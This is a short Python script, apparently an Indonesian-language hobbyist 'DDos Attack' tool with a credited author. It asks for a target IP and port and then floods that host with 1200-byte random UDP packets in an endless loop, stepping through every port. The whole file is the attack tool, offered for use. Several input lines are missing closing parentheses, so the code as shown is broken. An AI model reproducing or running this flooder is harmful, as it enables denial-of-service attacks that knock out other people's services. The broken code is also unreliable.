import sys
import os
import time
import socket
import random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1200)
##############

os.system("clear")
os.system("figlet DDos Attack")
print ("Author   : PheXcReY-Galaxy")
print ("You Tube : https://www.youtube.com/c/PheXcReY-Galaxy")
print ("github   : https://github.com/PheXcReY")
print ("Facebook : https://www.facebook.com/ArthurXzz")

ip = str(input("IP Target : ")
port = int(input("Port Target : ")
choice = str(input("Sudah Menyiapkan Virus?(y/n) : ")
times = int(input("Masukan Jumlah Paket Virus : ")
threads = int(input("Masukan Jumlah Kecepatan Virus : ")

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[======               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(" ============== Mengirim Virus Corona Ke Target Dan Memberikan Permen Lolipop ============ ")
     sock.sendto(bytes, (ip,port))
     if port == 65534:
       port = 1
